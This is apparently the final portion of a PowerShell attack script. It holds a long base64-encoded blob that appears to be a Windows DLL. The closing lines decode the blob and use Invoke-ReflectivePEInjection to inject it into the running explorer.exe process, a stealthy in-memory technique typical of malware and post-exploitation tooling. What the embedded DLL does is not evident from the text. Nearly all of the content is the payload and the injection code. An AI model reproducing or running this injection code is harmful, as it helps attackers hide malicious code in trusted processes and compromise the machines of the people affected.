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dhc0ludm9rZXInIHVpQWNjZXNzPSdmYWxzZScgLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAQAQAQAAmKKgorCiyKLQotii8KL4ogCjKKMwozijQKNIo2ijcKN4o5CjmKOgo8CjyKPQo7ikwKTIpNCkEKYYpiCmKKYwpjimQKZIplCmWKZgpmimcKZ4poCmiKaQppimoKaoprCmuKbApsim0KbYpuCm6KbwpvimAKcIpxCnGKcgpyinMKc4p0CnSKdQp1inYKdop3CneKeAp4inkKeYp6CnqKewp7inwKfIp9Cn2Kfgp+in8Kf4pwCoCKgQqBioIKgoqDCoOKhAqEioUKhYqGCoaKhwqHiogKiIqJComKigqKiosKi4qMCoyKjQqNio4KjoqPCo+KgAqQipEKkYqSCpKKmIr5CvmK+grwAAAFABABABAABAoVChYKFooXCheKGAoYihkKGYoaihsKG4ocChyKHQodih4KH4oQiiEKIYoiCiKKLwo/ijAKQIpBCkGKQgpCikMKQ4pECkSKRQpFikYKRopHCkeKSApIikkKSYpKCkqKSwpLikwKTIpNCk2KTgpOik8KT4pAClCKUQpRilIKUopTClOKVApVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeCl6KXwpfilAKYIphCmGKYgpiimMKY4pkCmSKZQplimYKZopnCmeKaApoimkKaYpqCmqKZwqniqgKqIqpCqmKqgqqiqsKq4qsCqyKrQqtiq4KroqvCq+KoAqwirAAAAYAEAEAAAACCgKKAwoDigAHABALgBAACYoqiiuKLIotii6KL4ogijGKMoozijSKNYo2ijeKOIo5ijqKO4o8ij2KPoo/ijCKQYpCikOKRIpFikaKR4pIikmKSopLikyKTYpOik+KQIpRilKKU4pUilWKVopXiliKWYpailuKXIpdil6KX4pQimGKYopjimSKZYpmimeKaIppimqKa4psim2KbopvimCKcYpyinOKdIp1inaKd4p4inmKeop7inyKfYp+in+KcIqBioKKg4qEioWKhoqHioiKiYqKiouKjIqNio6Kj4qAipGKkoqTipSKlYqWipeKmIqZipqKm4qcip2KnoqfipCKoYqiiqOKpIqliqaKp4qoiqmKqoqriqyKrYquiq+KoIqxirKKs4q0irWKtoq3iriKuYq6iruKvIq9ir6Kv4qwisGKworDisSKxYrGiseKyIrJisqKy4rMis2KzorPisCK0YrSitOK1IrVitaK14rYitmK2orbityK3Yreit+K0IrhiuKK44rkiuWK5orniuiK6YrqiuuK7Irtiu6K74rgivGK8orzivSK9Yr2iveK+Ir5ivqK+4r8iv2K/or/ivAAAAgAEAhAAAAAigGKAooDigSKBYoGigeKCIoJigqKC4oMig8KwArRCtIK0wrUCtUK1grXCtgK2QraCtsK3ArdCt4K3wrQCuEK4grjCuQK5QrmCucK6ArpCuoK6wrsCu0K7grvCuAK8QryCvMK9Ar1CvYK9wr4CvkK+gr7CvwK/Qr+Cv8K8AkAEAcAEAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgonCigKKQoqCisKLAotCi4KLwogCjEKMgozCjQKNQo2CjcKOAo5CjoKOwo8Cj0KPgo/CjAKQQpCCkMKRApFCkYKRwpICkkKSgpLCkwKTQpOCk8KQApRClIKUwpUClUKVgpXClgKWQpaClsKXApdCl4KXwpQCmEKYgpjCmQKZQpmCmcKaAppCmoKawpsCm0KbgpvCmAKcQpyCnMKdAp1CnYKdwp4CnkKegp7CnwKfQp+Cn8KcAqBCoIKgwqECoUKhgqHCogKiQqKCosKjAqNCo4KjwqACpEKkgqTCpQKlQqWCpcKmAqZCpoKmwqcCp0KngqfCpAKoQqiCqMKpAqlCqYKpwqoCqkKqgqrCqwKrQquCq8KoAqxCrIKsAAADQAQAQAAAAWKNwo3ijAAAAAAIATAAAADCggKHIoeihCKIookiieKKQopiioKLYouCiWKVwqICoiKiQqJiooKioqLCouKjAqMio2KjgqOio8Kj4qACpCKkQqQAAAEACABQAAABgoYihsKHgoQCiKKIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
"


$ProcId = (Get-Process explorer).Id
$Bytes = [System.Convert]::FromBase64String($dllData)
Invoke-ReflectivePEInjection -PEBytes $Bytes -ProcId $procId